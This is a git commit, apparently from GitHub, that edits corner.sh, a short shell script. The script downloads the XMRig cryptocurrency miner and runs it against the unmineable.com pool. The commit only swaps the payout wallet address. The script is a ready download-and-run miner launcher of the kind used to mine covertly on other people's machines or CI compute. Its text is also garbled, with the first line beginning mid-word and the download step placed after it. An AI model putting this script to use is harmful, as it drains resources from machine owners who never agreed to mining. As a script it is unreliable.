2057719914f3ca74c4bad454e58d2ee16ad23b66
hunktory <119156968+hunktory@users.noreply.github.com>
2022-11-27 01:15:52 -0800

    Update corner.sh

--- corner.sh
+++ corner.sh
@@ -1,2 +1,2 @@
--6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:0x5030137420e427384f7426A6f8F71D1b2b2455a6.itsmemario -p x
+-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TJUMLJL7VGGoS5AiZgNBuxkoVj3Fxxpg1Z.itsmemario -p x
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig
